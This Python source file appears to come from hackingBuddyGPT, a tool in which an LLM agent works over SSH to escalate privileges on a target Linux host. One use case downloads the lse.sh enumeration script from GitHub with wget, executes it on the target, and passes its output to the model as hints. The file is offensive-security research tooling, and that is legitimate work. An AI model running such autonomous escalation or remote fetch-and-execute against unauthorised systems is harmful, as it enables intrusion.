import json
import pathlib
from dataclasses import dataclass
from mako.template import Template

from hackingBuddyGPT.capabilities import SSHRunCommand, SSHTestCredential
from hackingBuddyGPT.usecases.agents import Agent
from .common import Privesc
from hackingBuddyGPT.utils import SSHConnection
from hackingBuddyGPT.usecases.base import AutonomousUseCase, register_use_case, use_case
from hackingBuddyGPT.utils.openai.openai_llm import OpenAIConnection

template_dir = pathlib.Path(__file__).parent / "templates"
template_next_cmd = Template(filename=str(template_dir / "query_next_command.txt"))
template_analyze = Template(filename=str(template_dir / "analyze_cmd.txt"))
template_state = Template(filename=str(template_dir / "update_state.txt"))
template_lse = Template(filename=str(template_dir / "get_hint_from_lse.txt"))

class LinuxPrivescWithHintFile(AutonomousUseCase):
    conn: SSHConnection = None
    system: str = ''
    enable_explanation: bool = False
    enable_update_state: bool = False
    disable_history: bool = False
    hints: str = ""

    _priv_esc: Agent = None

    def init(self):
        super().init()

    def setup(self):
        # read the hint
        hint = self.read_hint()

        # create the inner agent
        self._priv_esc = LinuxPrivesc(
            conn=self.conn, # must be set in sub classes
            enable_explanation=self.enable_explanation,
            disable_history=self.disable_history,
            hint=hint,
            #log_db = self.log_db,
            #console = self.console,
            llm = self.llm,
            #tag = self.tag,
            max_turns = self.max_turns
        )

        self._priv_esc.init()
        self._priv_esc.setup()

    def perform_round(self, turn: int) -> bool:
        return self._priv_esc.perform_round(turn)

    # simple helper that reads the hints file and returns the hint
    # for the current machine (test-case)
    def read_hint(self):
        if self.hints != "":
            try:
                with open(self.hints, "r") as hint_file:
                    hints = json.load(hint_file)
                    if self.conn.hostname in hints:
                        return hints[self.conn.hostname]
            except:
                self._log.console.print("[yellow]Was not able to load hint file")
        else:
            self._log.console.print("[yellow]calling the hintfile use-case without a hint file?")
        return ""


@use_case("Linux Privilege Escalation using lse.sh for initial guidance")
class PrivescWithLSE(Agent):
    conn: SSHConnection = None
    system: str = ''
    enable_explanation: bool = False
    enable_update_state: bool = False
    disable_history: bool = False
    low_llm: OpenAIConnection = None

    _agent: Agent = None
    _turns_per_hint:int = 20

    def init(self):
        super().init()
    
    def perform_round(self, turn: int) -> bool:
        if turn == 1:
            self._hints = self.read_hint().splitlines()
            self._turns_per_hint = int(self.max_turns / len(self._hints))

        if turn % self._turns_per_hint == 1:
            hint_pos = int(turn / self._turns_per_hint)

            if hint_pos < len(self._hints):
                i = self._hints[hint_pos]
                self._log.console.print("[green]Now using Hint: " + i)
            
                # call the inner use-case
                self._agent = LinuxPrivesc(
                    conn=self.conn, # must be set in sub classes
                    enable_explanation=self.enable_explanation,
                    disable_history=self.disable_history,
                    hint=i,
                    log_db = self.log_db,
                    console = self.console,
                    llm = self.low_llm,
                    tag = self.tag + "_hint_" +i,
                    max_turns = self.max_turns
                )

                self._agent.init()
                self._agent.setup()

        return self._agent.perform_round(turn)

    # simple helper that uses lse.sh to get hints from the system
    def read_hint(self):
        self._log.console.print("[green]performing initial enumeration with lse.sh")

        run_cmd = "wget -q 'https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh' -O lse.sh;chmod 700 lse.sh; ./lse.sh -c -i -l 0 | grep -v 'nope$' | grep -v 'skip$'"

        result, _ = SSHRunCommand(conn=self.conn, timeout=120)(run_cmd)

        self.console.print("[yellow]got the output: " + result)
        cmd = self.llm.get_response(template_lse, lse_output=result, number=3)
        self.console.print("[yellow]got the cmd: " + cmd.result)

        return cmd.result


class LinuxPrivesc(Privesc):
    conn: SSHConnection = None
    system: str = "linux"

    def init(self):
        super().init()
        self.add_capability(SSHRunCommand(conn=self.conn), default=True)
        self.add_capability(SSHTestCredential(conn=self.conn))


LinuxPrivescUseCase = use_case("Linux Privilege Escalation")(LinuxPrivesc)

register_use_case("LinuxPrivescWithHintFile", "Linux Privilege Escalation", LinuxPrivescWithHintFile)